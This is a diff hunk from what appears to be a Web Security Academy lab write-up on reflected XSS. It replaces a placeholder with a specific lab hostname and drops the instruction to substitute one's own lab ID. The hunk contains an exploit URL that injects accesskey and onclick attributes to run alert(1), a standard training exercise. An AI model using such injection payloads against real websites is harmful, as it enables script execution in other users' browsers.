@@ -31,10 +31,10 @@ The application escapes angle brackets, preventing the injection of new HTML ele
 **Exploit URL:**
 
 ```text
-https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
+https://0a1a0010031ef7d1800435c3008100ed.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
 ```
 
-Replace `YOUR-LAB-ID` with the actual lab identifier.
+
 
 **Decoded injected input:**
 
